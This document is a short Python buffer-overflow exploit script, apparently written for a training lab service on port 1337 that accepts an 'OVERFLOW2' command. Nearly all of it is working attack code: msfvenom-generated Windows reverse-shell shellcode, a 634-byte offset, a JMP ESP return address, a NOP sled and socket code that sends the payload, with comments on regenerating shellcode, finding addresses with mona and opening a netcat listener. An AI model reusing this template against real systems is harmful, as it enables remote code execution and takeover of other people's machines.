#!/usr/bin/env python3

import socket

ip = '10.10.76.26'
port = 1337
import socket

#replace it with your shellcode
#using >> msfvenom -p windows/shell_reverse_tcp lhost=my-ip lport=any-port(notUsed) EXTIFUNX=thread -b "\x00<badChar>" -f python -v "sc"

sc = ("\xfc\xbb\xb1\x25\x24\x66\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x4d\xcd\xa6"
"\x66\xad\x0e\xc7\xef\x48\x3f\xc7\x94\x19\x10\xf7\xdf\x4f"
"\x9d\x7c\x8d\x7b\x16\xf0\x1a\x8c\x9f\xbf\x7c\xa3\x20\x93"
"\xbd\xa2\xa2\xee\x91\x04\x9a\x20\xe4\x45\xdb\x5d\x05\x17"
"\xb4\x2a\xb8\x87\xb1\x67\x01\x2c\x89\x66\x01\xd1\x5a\x88"
"\x20\x44\xd0\xd3\xe2\x67\x35\x68\xab\x7f\x5a\x55\x65\xf4"
"\xa8\x21\x74\xdc\xe0\xca\xdb\x21\xcd\x38\x25\x66\xea\xa2"
"\x50\x9e\x08\x5e\x63\x65\x72\x84\xe6\x7d\xd4\x4f\x50\x59"
"\xe4\x9c\x07\x2a\xea\x69\x43\x74\xef\x6c\x80\x0f\x0b\xe4"
"\x27\xdf\x9d\xbe\x03\xfb\xc6\x65\x2d\x5a\xa3\xc8\x52\xbc"
"\x0c\xb4\xf6\xb7\xa1\xa1\x8a\x9a\xad\x06\xa7\x24\x2e\x01"
"\xb0\x57\x1c\x8e\x6a\xff\x2c\x47\xb5\xf8\x53\x72\x01\x96"
"\xad\x7d\x72\xbf\x69\x29\x22\xd7\x58\x52\xa9\x27\x64\x87"
"\x7e\x77\xca\x78\x3f\x27\xaa\x28\xd7\x2d\x25\x16\xc7\x4e"
"\xef\x3f\x62\xb5\x78\x4a\x75\xa4\x22\x22\x7b\xc6\xf1\x9b"
"\xf2\x20\x9f\xcb\x52\xfb\x08\x75\xff\x77\xa8\x7a\xd5\xf2"
"\xea\xf1\xda\x03\xa4\xf1\x97\x17\x51\xf2\xed\x45\xf4\x0d"
"\xd8\xe1\x9a\x9c\x87\xf1\xd5\xbc\x1f\xa6\xb2\x73\x56\x22"
"\x2f\x2d\xc0\x50\xb2\xab\x2b\xd0\x69\x08\xb5\xd9\xfc\x34"
"\x91\xc9\x38\xb4\x9d\xbd\x94\xe3\x4b\x6b\x53\x5a\x3a\xc5"
"\x0d\x31\x94\x81\xc8\x79\x27\xd7\xd4\x57\xd1\x37\x64\x0e"
"\xa4\x48\x49\xc6\x20\x31\xb7\x76\xce\xe8\x73\x96\x2d\x38"
"\x8e\x3f\xe8\xa9\x33\x22\x0b\x04\x77\x5b\x88\xac\x08\x98"
"\x90\xc5\x0d\xe4\x16\x36\x7c\x75\xf3\x38\xd3\x76\xd6\x38"
"\xd3\x88\xd9")


#replace it with your command chall
command = "OVERFLOW2 "

#replce the offset number depending on the situation
offset = 634*"A"

#replce the jmp ESP address depending on the situation
#memory address thet we get from >>!mona jmp -r esp -cpb "\x00<badChar>" << يكب بالعكس مع \x  : ex 625011AF FFE4 JMP ESP    "\xAF\x11\x50\x62"
jmp = "\xAF\x11\x50\x62"

nops = 16*"\x90"
string = command + offset + jmp + nops + sc

try:
    with socket.socket() as s:
        s.connect((ip,port))
        print("sending exploit")
        s.send(bytes(string,'latin-1'))
except:
    print("faild to connect")


#nc -nlvp 9001  >>to lisen
#then run the code